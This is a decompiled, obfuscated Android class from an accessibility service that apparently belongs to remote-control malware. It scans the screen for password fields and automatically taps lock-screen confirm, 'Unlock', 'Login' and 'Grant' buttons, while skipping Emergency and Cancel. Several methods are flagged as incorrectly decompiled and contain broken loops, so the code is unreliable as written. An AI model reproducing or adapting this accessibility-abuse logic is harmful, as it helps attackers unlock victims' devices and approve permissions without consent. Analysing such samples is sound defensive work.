package p000;

import android.content.Context;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.jvm.internal.Ref$FloatRef;
import kotlin.jvm.internal.Ref$ObjectRef;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.android.C0785a0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class l81 {

    /* renamed from: a0 */
    public final dqtvuisjd f57845a0;

    /* renamed from: a1 */
    public final Context f57846a1;

    static {
        new k81(null);
    }

    public l81(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(dqtvuisjdVar2, "context");
        this.f57845a0 = dqtvuisjdVar;
        this.f57846a1 = dqtvuisjdVar2;
        C1180rh c1180rh = AbstractC1262tj.f60233a0;
        C0785a0 c0785a0 = sc0.f59953a0;
        y21 y21Var = new y21();
        c0785a0.getClass();
        AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var));
    }

    /* renamed from: a0 */
    public static int m213780a0(AccessibilityNodeInfo accessibilityNodeInfo, int i, int i2) {
        String lowerCase;
        String lowerCase2;
        int i3;
        String string;
        String string2;
        String string3;
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String lowerCase3 = "";
            if (text == null || (string3 = text.toString()) == null) {
                lowerCase = "";
            } else {
                lowerCase = string3.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                lowerCase2 = "";
            } else {
                lowerCase2 = string2.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className != null && (string = className.toString()) != null) {
                lowerCase3 = string.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55778c8, dh0.f55752a2);
            if (!arrayListM213298i5.isEmpty()) {
                int size = arrayListM213298i5.size();
                int i4 = 0;
                while (i4 < size) {
                    Object obj = arrayListM213298i5.get(i4);
                    i4++;
                    String str = (String) obj;
                    if (AbstractC0779a1.m213652a5(lowerCase, str, false) || AbstractC0779a1.m213652a5(lowerCase2, str, false)) {
                        i3 = 40;
                        break;
                    }
                }
            }
            i3 = 0;
            double dCenterY = rect.centerY();
            double d = i2;
            if (dCenterY > 0.7d * d) {
                i3 += 25;
            } else if (dCenterY > 0.5d * d) {
                i3 += 15;
            } else if (dCenterY > 0.3d * d) {
                i3 += 5;
            }
            if (AbstractC0779a1.m213652a5(lowerCase3, "button", false)) {
                i3 += 20;
            } else if (AbstractC0779a1.m213652a5(lowerCase3, "imageview", false)) {
                i3 += 15;
            } else if (AbstractC0779a1.m213652a5(lowerCase3, "textview", false)) {
                i3 += 10;
            }
            int iWidth = rect.width();
            int iHeight = rect.height();
            if (iWidth > 50 && iHeight > 30 && iWidth < i * 0.6d && iHeight < d * 0.2d) {
                i3 += 10;
            }
            if (rect.centerX() > i * 0.6d) {
                i3 += 5;
            }
            if (m213787b4(lowerCase, lowerCase2)) {
                i3 -= 50;
            }
            ArrayList arrayListM213298i52 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55776c6, dh0.f55753a3), dh0.f55784d4);
            if (!arrayListM213298i52.isEmpty()) {
                int size2 = arrayListM213298i52.size();
                int i5 = 0;
                while (i5 < size2) {
                    Object obj2 = arrayListM213298i52.get(i5);
                    i5++;
                    String str2 = (String) obj2;
                    if (AbstractC0779a1.m213652a5(lowerCase, str2, false) || AbstractC0779a1.m213652a5(lowerCase2, str2, false)) {
                        i3 -= 30;
                        break;
                    }
                }
            }
            return Math.max(0, i3);
        } catch (Exception e) {
            t60.m214705c6("UIAnalysisManager", "计算按钮得分失败", e);
            return 0;
        }
    }

    /* renamed from: a2 */
    public static final void m213781a2(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        if (i > 15) {
            return;
        }
        if (accessibilityNodeInfo.isClickable()) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m213781a2(i + 1, child, arrayList);
            }
        }
    }

    /* renamed from: a5 */
    public static final void m213782a5(Ref$ObjectRef ref$ObjectRef, String str, AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        String string2;
        String string3;
        String string4;
        if (i > 15 || ref$ObjectRef.f57626a0 != null) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String str2 = "";
        if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
            string = "";
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
            str2 = string3;
        }
        if ((string.equalsIgnoreCase(str) || AbstractC0779a1.m213652a5(str2, str, true)) && accessibilityNodeInfo.isClickable()) {
            ref$ObjectRef.f57626a0 = accessibilityNodeInfo;
            return;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m213782a5(ref$ObjectRef, str, child, i + 1);
                if (ref$ObjectRef.f57626a0 == null) {
                    child.recycle();
                }
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:41:0x0075 A[Catch: Exception -> 0x0021, TryCatch #0 {Exception -> 0x0021, blocks: (B:3:0x0001, B:5:0x0008, B:8:0x0010, B:10:0x0016, B:16:0x0025, B:18:0x002b, B:20:0x0031, B:24:0x003d, B:27:0x0044, B:29:0x0048, B:31:0x0050, B:38:0x006c, B:33:0x0057, B:35:0x0065, B:39:0x006f, B:41:0x0075, B:43:0x007b, B:46:0x0082), top: B:51:0x0001 }] */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final AccessibilityNodeInfo m213783a8(l81 l81Var, String[] strArr, int i, int i2, AccessibilityNodeInfo accessibilityNodeInfo) {
        int childCount;
        String string;
        String string2;
        String string3;
        String string4;
        try {
            if (accessibilityNodeInfo.isClickable()) {
                CharSequence text = accessibilityNodeInfo.getText();
                String str = "";
                if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
                    str = string3;
                }
                if (!m213787b4(string, str)) {
                    for (String str2 : strArr) {
                        if (string.equalsIgnoreCase(str2) || AbstractC0779a1.m213652a5(str, str2, true)) {
                            Rect rect = new Rect();
                            accessibilityNodeInfo.getBoundsInScreen(rect);
                            if (m213788b5(rect, i, i2) && m213789b6(rect, i, i2)) {
                                return accessibilityNodeInfo;
                            }
                        }
                    }
                    childCount = accessibilityNodeInfo.getChildCount();
                    for (int i3 = 0; i3 < childCount; i3++) {
                        AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
                        if (child != null) {
                            AccessibilityNodeInfo accessibilityNodeInfoM213783a8 = m213783a8(l81Var, strArr, i, i2, child);
                            if (accessibilityNodeInfoM213783a8 != null) {
                                return accessibilityNodeInfoM213783a8;
                            }
                            child.recycle();
                        }
                    }
                }
            } else {
                childCount = accessibilityNodeInfo.getChildCount();
                while (i3 < childCount) {
                }
            }
            return null;
        } catch (Exception e) {
            t60.m214705c6("UIAnalysisManager", "搜索数字键盘确认按钮失败", e);
            return null;
        }
    }

    /* renamed from: a9 */
    public static final void m213784a9(Ref$FloatRef ref$FloatRef, AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String lowerCase;
        String string;
        if (i > 10 || ref$FloatRef.f57623a0 > 0.0f) {
            return;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            lowerCase = "";
        } else {
            lowerCase = string.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        boolean zM213652a5 = AbstractC0779a1.m213652a5(lowerCase, "edittext", false);
        boolean zIsPassword = accessibilityNodeInfo.isPassword();
        if (zM213652a5 || zIsPassword) {
            accessibilityNodeInfo.getBoundsInScreen(new Rect());
            ref$FloatRef.f57623a0 = r6.centerY();
            return;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m213784a9(ref$FloatRef, child, i + 1);
                child.recycle();
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:41:0x008b A[Catch: Exception -> 0x0021, TryCatch #0 {Exception -> 0x0021, blocks: (B:3:0x0001, B:5:0x0008, B:8:0x0010, B:10:0x0016, B:16:0x0025, B:18:0x002b, B:20:0x0031, B:24:0x003d, B:27:0x0044, B:29:0x0048, B:31:0x0050, B:38:0x0082, B:33:0x0057, B:35:0x007b, B:39:0x0085, B:41:0x008b, B:43:0x0091, B:46:0x0098), top: B:51:0x0001 }] */
    /* renamed from: b2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final AccessibilityNodeInfo m213785b2(l81 l81Var, String[] strArr, AccessibilityNodeInfo accessibilityNodeInfo) {
        int childCount;
        String string;
        String string2;
        String string3;
        String string4;
        try {
            if (accessibilityNodeInfo.isClickable()) {
                CharSequence text = accessibilityNodeInfo.getText();
                String str = "";
                if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
                    str = string3;
                }
                if (!m213787b4(string, str)) {
                    for (String str2 : strArr) {
                        if (string.equalsIgnoreCase(str2) || AbstractC0779a1.m213652a5(str, str2, true)) {
                            Rect rect = new Rect();
                            accessibilityNodeInfo.getBoundsInScreen(rect);
                            Pair pairM213572b9 = kj1.m213572b9(l81Var.f57846a1);
                            int iIntValue = ((Number) pairM213572b9.f57556a0).intValue();
                            int iIntValue2 = ((Number) pairM213572b9.f57557a1).intValue();
                            if (m213788b5(rect, iIntValue, iIntValue2) && m213789b6(rect, iIntValue, iIntValue2)) {
                                return accessibilityNodeInfo;
                            }
                        }
                    }
                    childCount = accessibilityNodeInfo.getChildCount();
                    for (int i = 0; i < childCount; i++) {
                        AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                        if (child != null) {
                            AccessibilityNodeInfo accessibilityNodeInfoM213785b2 = m213785b2(l81Var, strArr, child);
                            if (accessibilityNodeInfoM213785b2 != null) {
                                return accessibilityNodeInfoM213785b2;
                            }
                            child.recycle();
                        }
                    }
                }
            } else {
                childCount = accessibilityNodeInfo.getChildCount();
                while (i < childCount) {
                }
            }
            return null;
        } catch (Exception e) {
            t60.m214705c6("UIAnalysisManager", "搜索文本键盘确认按钮失败", e);
            return null;
        }
    }

    /* renamed from: b3 */
    public static List m213786b3() {
        List listM213306g5 = AbstractC0716jf.m213306g5("→", "✓", "√", "⏎", "↵", "➤", "▶");
        List listM213306g52 = AbstractC0716jf.m213306g5("return", "enter", "send", "search", "go", "done");
        return AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.m212602a1(), listM213306g5), listM213306g52), AbstractC0716jf.m213306g5("登录", "解锁", "确认解锁", "Login", "Unlock", "Grant")));
    }

    /* JADX WARN: Removed duplicated region for block: B:9:0x0041  */
    /* renamed from: b4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m213787b4(String str, String str2) {
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String string = AbstractC0779a1.m213687e0(lowerCase).toString();
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String string2 = AbstractC0779a1.m213687e0(lowerCase2).toString();
        if (string.length() == 1) {
            char cCharAt = string.charAt(0);
            if (!Character.isLetterOrDigit(cCharAt) && !AbstractC0779a1.m213653a6(",.?!@#$%^&*()_+-=[]{}|;':\"<>/~`", cCharAt)) {
                Set<String> setM210734f7 = AbstractC0134bh.m210734f7(new String[]{"key", "键", "keyboard", "按键", "input", "输入", "space", "spacebar", "空格", "backspace", "删除", "shift", "ctrl", "alt", "tab", "caps", "num"});
                if (setM210734f7 == null || !setM210734f7.isEmpty()) {
                    for (String str3 : setM210734f7) {
                        if (AbstractC0779a1.m213652a5(string, str3, false) || AbstractC0779a1.m213652a5(string2, str3, false)) {
                        }
                    }
                }
                return false;
            }
        }
        return true;
    }

    /* renamed from: b5 */
    public static boolean m213788b5(Rect rect, int i, int i2) {
        double d = i2;
        if (rect.centerY() <= 0.3d * d || rect.centerY() >= d * 0.95d) {
            return false;
        }
        double d2 = i;
        return ((double) rect.centerX()) > 0.05d * d2 && ((double) rect.centerX()) < d2 * 0.95d;
    }

    /* renamed from: b6 */
    public static boolean m213789b6(Rect rect, int i, int i2) {
        int iWidth = rect.width();
        int iHeight = rect.height();
        return iWidth > 30 && iHeight > 20 && ((double) iWidth) < ((double) i) * 0.8d && ((double) iHeight) < ((double) i2) * 0.3d;
    }

    /* renamed from: a1 */
    public final boolean m213790a1(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        try {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            float fCenterX = rect.centerX();
            float fCenterY = rect.centerY();
            this.f57845a0.m211497j1(fCenterX, fCenterY);
            Pair pair = new Pair("x", Float.valueOf(fCenterX));
            Pair pair2 = new Pair("y", Float.valueOf(fCenterY));
            CharSequence text = accessibilityNodeInfo.getText();
            if (text == null || (string = text.toString()) == null) {
                string = "";
            }
            AbstractC0770a1.m213614f9(pair, pair2, new Pair("text", string), new Pair("method", str));
            return true;
        } catch (Exception e) {
            t60.m214705c6("UIAnalysisManager", "点击确认按钮失败", e);
            return false;
        }
    }

    /* renamed from: a3 */
    public final boolean m213791a3() {
        boolean zM213790a1;
        AccessibilityNodeInfo accessibilityNodeInfoM213792a4;
        AccessibilityNodeInfo accessibilityNodeInfoM213792a42;
        AccessibilityNodeInfo accessibilityNodeInfoM213795b0;
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f57845a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                t60.m214726f4("UIAnalysisManager", "❌ 无法获取根节点");
                return false;
            }
            AccessibilityNodeInfo accessibilityNodeInfoM213793a6 = m213793a6(rootInActiveWindow, m213786b3());
            if (accessibilityNodeInfoM213793a6 != null) {
                zM213790a1 = m213790a1(accessibilityNodeInfoM213793a6, "文本匹配");
                accessibilityNodeInfoM213793a6.recycle();
            } else {
                zM213790a1 = false;
            }
            if (!zM213790a1) {
                try {
                    zM213790a1 = true;
                } catch (Exception e) {
                    t60.m214705c6("UIAnalysisManager", "查找锁屏确认按钮失败", e);
                }
                if (!m213794a7(rootInActiveWindow) && !m213796b1(rootInActiveWindow)) {
                    try {
                        accessibilityNodeInfoM213792a4 = m213792a4(rootInActiveWindow);
                    } catch (Exception e2) {
                        t60.m214705c6("UIAnalysisManager", "查找通用锁屏确认按钮失败", e2);
                    }
                    if (accessibilityNodeInfoM213792a4 != null) {
                        zM213790a1 = m213790a1(accessibilityNodeInfoM213792a4, "通用锁屏确认");
                        accessibilityNodeInfoM213792a4.recycle();
                    } else {
                        zM213790a1 = false;
                    }
                }
            }
            if (!zM213790a1 && (accessibilityNodeInfoM213795b0 = m213795b0(rootInActiveWindow)) != null) {
                zM213790a1 = m213790a1(accessibilityNodeInfoM213795b0, "软键盘按钮");
                accessibilityNodeInfoM213795b0.recycle();
            }
            if (!zM213790a1 && (accessibilityNodeInfoM213792a42 = m213792a4(rootInActiveWindow)) != null) {
                zM213790a1 = m213790a1(accessibilityNodeInfoM213792a42, "启发式识别");
                accessibilityNodeInfoM213792a42.recycle();
            }
            rootInActiveWindow.recycle();
            if (!zM213790a1) {
                t60.m214726f4("UIAnalysisManager", "⚠️ 所有策略都失败，未找到确认按钮");
            }
            return zM213790a1;
        } catch (Exception e3) {
            t60.m214705c6("UIAnalysisManager", "❌ 查找确认按钮失败", e3);
            return false;
        }
    }

    /* renamed from: a4 */
    public final AccessibilityNodeInfo m213792a4(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            ArrayList arrayList = new ArrayList();
            int i = 0;
            try {
                m213781a2(0, accessibilityNodeInfo, arrayList);
            } catch (Exception e) {
                t60.m214705c6("UIAnalysisManager", "收集可点击节点失败", e);
            }
            Pair pairM213572b9 = kj1.m213572b9(this.f57846a1);
            int iIntValue = ((Number) pairM213572b9.f57556a0).intValue();
            int iIntValue2 = ((Number) pairM213572b9.f57557a1).intValue();
            int size = arrayList.size();
            AccessibilityNodeInfo accessibilityNodeInfo2 = null;
            int i2 = 0;
            while (i2 < size) {
                Object obj = arrayList.get(i2);
                i2++;
                AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj;
                int iM213780a0 = m213780a0(accessibilityNodeInfo3, iIntValue, iIntValue2);
                if (iM213780a0 <= i || iM213780a0 <= 30) {
                    accessibilityNodeInfo3.recycle();
                } else {
                    if (accessibilityNodeInfo2 != null) {
                        accessibilityNodeInfo2.recycle();
                    }
                    accessibilityNodeInfo2 = accessibilityNodeInfo3;
                    i = iM213780a0;
                }
            }
            return accessibilityNodeInfo2;
        } catch (Exception e2) {
            t60.m214705c6("UIAnalysisManager", "启发式按钮识别失败", e2);
            return null;
        }
    }

    /* renamed from: a6 */
    public final AccessibilityNodeInfo m213793a6(AccessibilityNodeInfo accessibilityNodeInfo, List list) {
        String string;
        String string2;
        String string3;
        Iterator it = list.iterator();
        while (true) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = null;
            if (!it.hasNext()) {
                return null;
            }
            String str = (String) it.next();
            try {
                Ref$ObjectRef ref$ObjectRef = new Ref$ObjectRef();
                m213782a5(ref$ObjectRef, str, accessibilityNodeInfo, 0);
                accessibilityNodeInfo2 = (AccessibilityNodeInfo) ref$ObjectRef.f57626a0;
            } catch (Exception e) {
                t60.m214705c6("UIAnalysisManager", "通过文本查找节点失败", e);
            }
            if (accessibilityNodeInfo2 != null) {
                try {
                    if (accessibilityNodeInfo2.isClickable()) {
                        CharSequence text = accessibilityNodeInfo2.getText();
                        String str2 = "";
                        if (text == null || (string3 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string3).toString()) == null) {
                            string = "";
                        }
                        CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                        if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                            str2 = string2;
                        }
                        if (!m213787b4(string, str2)) {
                            Rect rect = new Rect();
                            accessibilityNodeInfo2.getBoundsInScreen(rect);
                            int iIntValue = ((Number) kj1.m213572b9(this.f57846a1).f57556a0).intValue();
                            double dIntValue = ((Number) r3.f57557a1).intValue() * 0.3d;
                            if (rect.centerY() >= dIntValue) {
                                int iWidth = rect.width();
                                int iHeight = rect.height();
                                if (iWidth >= 30 && iHeight >= 20 && iWidth <= iIntValue * 0.8d && iHeight <= dIntValue) {
                                    return accessibilityNodeInfo2;
                                }
                            }
                        }
                    }
                } catch (Exception e2) {
                    t60.m214705c6("UIAnalysisManager", "验证确认按钮失败", e2);
                }
            }
            if (accessibilityNodeInfo2 != null) {
                accessibilityNodeInfo2.recycle();
            }
        }
    }

    /* renamed from: a7 */
    public final boolean m213794a7(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            Pair pairM213572b9 = kj1.m213572b9(this.f57846a1);
            AccessibilityNodeInfo accessibilityNodeInfoM213783a8 = m213783a8(this, (String[]) AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55778c8, dh0.f55752a2), AbstractC0716jf.m213306g5("✓", "→")).toArray(new String[0]), ((Number) pairM213572b9.f57556a0).intValue(), ((Number) pairM213572b9.f57557a1).intValue(), accessibilityNodeInfo);
            if (accessibilityNodeInfoM213783a8 == null) {
                return false;
            }
            boolean zM213790a1 = m213790a1(accessibilityNodeInfoM213783a8, "数字键盘确认");
            accessibilityNodeInfoM213783a8.recycle();
            return zM213790a1;
        } catch (Exception e) {
            t60.m214705c6("UIAnalysisManager", "查找数字键盘确认按钮失败", e);
            return false;
        }
    }

    /* renamed from: b0 */
    public final AccessibilityNodeInfo m213795b0(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfo2;
        float f;
        Object obj;
        Object next;
        String string;
        String string2;
        boolean z;
        boolean z2;
        String string3;
        String string4;
        try {
            ArrayList arrayList = new ArrayList();
            boolean z3 = false;
            try {
                m213781a2(0, accessibilityNodeInfo, arrayList);
            } catch (Exception e) {
                t60.m214705c6("UIAnalysisManager", "收集可点击节点失败", e);
            }
            Pair pairM213572b9 = kj1.m213572b9(this.f57846a1);
            int iIntValue = ((Number) pairM213572b9.f57556a0).intValue();
            int iIntValue2 = ((Number) pairM213572b9.f57557a1).intValue();
            try {
                Ref$FloatRef ref$FloatRef = new Ref$FloatRef();
                m213784a9(ref$FloatRef, accessibilityNodeInfo, 0);
                f = ref$FloatRef.f57623a0;
            } catch (Exception e2) {
                t60.m214705c6("UIAnalysisManager", "查找密码输入框位置失败", e2);
                f = 0.0f;
            }
            float f2 = f > 0.0f ? f + 200 : iIntValue2 * 0.6f;
            ArrayList arrayList2 = new ArrayList();
            int size = arrayList.size();
            int i = 0;
            while (true) {
                String str = "";
                if (i >= size) {
                    break;
                }
                Object obj2 = arrayList.get(i);
                i++;
                AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj2;
                Rect rect = new Rect();
                accessibilityNodeInfo3.getBoundsInScreen(rect);
                CharSequence text = accessibilityNodeInfo3.getText();
                String str2 = (text == null || (string4 = text.toString()) == null) ? "" : string4;
                accessibilityNodeInfo2 = null;
                try {
                    CharSequence contentDescription = accessibilityNodeInfo3.getContentDescription();
                    if (contentDescription != null && (string3 = contentDescription.toString()) != null) {
                        str = string3;
                    }
                    boolean z4 = ((float) rect.centerY()) > f2 ? true : z3;
                    boolean z5 = rect.width() > 50 && rect.height() > 30 && rect.width() < iIntValue / 3;
                    boolean zM213787b4 = m213787b4(str2, str);
                    float f3 = f2;
                    boolean z6 = z5;
                    boolean z7 = ((double) rect.centerX()) > ((double) iIntValue) * 0.7d;
                    boolean z8 = ((double) rect.centerY()) > ((double) iIntValue2) * 0.85d;
                    String[] strArr = {"Emergency", "紧急", "取消", "Cancel", "返回", "Back"};
                    boolean z9 = z7;
                    int i2 = 0;
                    while (i2 < 6) {
                        String str3 = strArr[i2];
                        z = z8;
                        if (!AbstractC0779a1.m213652a5(str2, str3, true) && !AbstractC0779a1.m213652a5(str, str3, true)) {
                            i2++;
                            z8 = z;
                        }
                        z2 = false;
                    }
                    z = z8;
                    z2 = true;
                    boolean z10 = AbstractC0779a1.m213652a5(str2, "确认", true) || AbstractC0779a1.m213652a5(str2, "OK", true) || AbstractC0779a1.m213652a5(str2, "Done", true) || AbstractC0779a1.m213652a5(str, "confirm", true);
                    if (z4 && z6 && !zM213787b4 && z2 && (z9 || z || z10)) {
                        arrayList2.add(obj2);
                    }
                    f2 = f3;
                    z3 = false;
                } catch (Exception e3) {
                    e = e3;
                    t60.m214705c6("UIAnalysisManager", "查找软键盘确认按钮失败", e);
                    return accessibilityNodeInfo2;
                }
            }
            if (arrayList2.isEmpty()) {
                int size2 = arrayList.size();
                int i3 = 0;
                while (i3 < size2) {
                    Object obj3 = arrayList.get(i3);
                    i3++;
                    ((AccessibilityNodeInfo) obj3).recycle();
                }
                return null;
            }
            String[] strArr2 = (String[]) AbstractC0715je.m213298i5(dh0.f55778c8, dh0.f55752a2).toArray(new String[0]);
            int size3 = arrayList2.size();
            int i4 = 0;
            loop3: while (true) {
                if (i4 >= size3) {
                    obj = null;
                    break;
                }
                obj = arrayList2.get(i4);
                i4++;
                AccessibilityNodeInfo accessibilityNodeInfo4 = (AccessibilityNodeInfo) obj;
                CharSequence text2 = accessibilityNodeInfo4.getText();
                if (text2 == null || (string = text2.toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription2 = accessibilityNodeInfo4.getContentDescription();
                if (contentDescription2 == null || (string2 = contentDescription2.toString()) == null) {
                    string2 = "";
                }
                for (String str4 : strArr2) {
                    if (AbstractC0779a1.m213652a5(string, str4, true) || AbstractC0779a1.m213652a5(string2, str4, true)) {
                        break loop3;
                    }
                }
            }
            if (obj != null) {
                ArrayList arrayList3 = new ArrayList();
                int size4 = arrayList.size();
                int i5 = 0;
                while (i5 < size4) {
                    Object obj4 = arrayList.get(i5);
                    i5++;
                    if (!t60.m214686a2((AccessibilityNodeInfo) obj4, obj)) {
                        arrayList3.add(obj4);
                    }
                }
                int size5 = arrayList3.size();
                int i6 = 0;
                while (i6 < size5) {
                    Object obj5 = arrayList3.get(i6);
                    i6++;
                    ((AccessibilityNodeInfo) obj5).recycle();
                }
                return (AccessibilityNodeInfo) obj;
            }
            Iterator it = arrayList2.iterator();
            if (it.hasNext()) {
                next = it.next();
                if (it.hasNext()) {
                    Rect rect2 = new Rect();
                    ((AccessibilityNodeInfo) next).getBoundsInScreen(rect2);
                    int iCenterX = rect2.centerX() + rect2.centerY();
                    do {
                        Object next2 = it.next();
                        Rect rect3 = new Rect();
                        ((AccessibilityNodeInfo) next2).getBoundsInScreen(rect3);
                        int iCenterX2 = rect3.centerX() + rect3.centerY();
                        if (iCenterX < iCenterX2) {
                            next = next2;
                            iCenterX = iCenterX2;
                        }
                    } while (it.hasNext());
                }
            } else {
                next = null;
            }
            ArrayList arrayList4 = new ArrayList();
            int size6 = arrayList.size();
            int i7 = 0;
            while (i7 < size6) {
                Object obj6 = arrayList.get(i7);
                i7++;
                if (!t60.m214686a2((AccessibilityNodeInfo) obj6, next)) {
                    arrayList4.add(obj6);
                }
            }
            int size7 = arrayList4.size();
            int i8 = 0;
            while (i8 < size7) {
                Object obj7 = arrayList4.get(i8);
                i8++;
                ((AccessibilityNodeInfo) obj7).recycle();
            }
            return (AccessibilityNodeInfo) next;
        } catch (Exception e4) {
            e = e4;
            accessibilityNodeInfo2 = null;
            t60.m214705c6("UIAnalysisManager", "查找软键盘确认按钮失败", e);
            return accessibilityNodeInfo2;
        }
    }

    /* renamed from: b1 */
    public final boolean m213796b1(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            AccessibilityNodeInfo accessibilityNodeInfoM213785b2 = m213785b2(this, (String[]) AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55778c8, dh0.f55752a2), AbstractC0716jf.m213306g5("→", "✓")).toArray(new String[0]), accessibilityNodeInfo);
            if (accessibilityNodeInfoM213785b2 == null) {
                return false;
            }
            boolean zM213790a1 = m213790a1(accessibilityNodeInfoM213785b2, "文本键盘确认");
            accessibilityNodeInfoM213785b2.recycle();
            return zM213790a1;
        } catch (Exception e) {
            t60.m214705c6("UIAnalysisManager", "查找文本键盘确认按钮失败", e);
            return false;
        }
    }
}
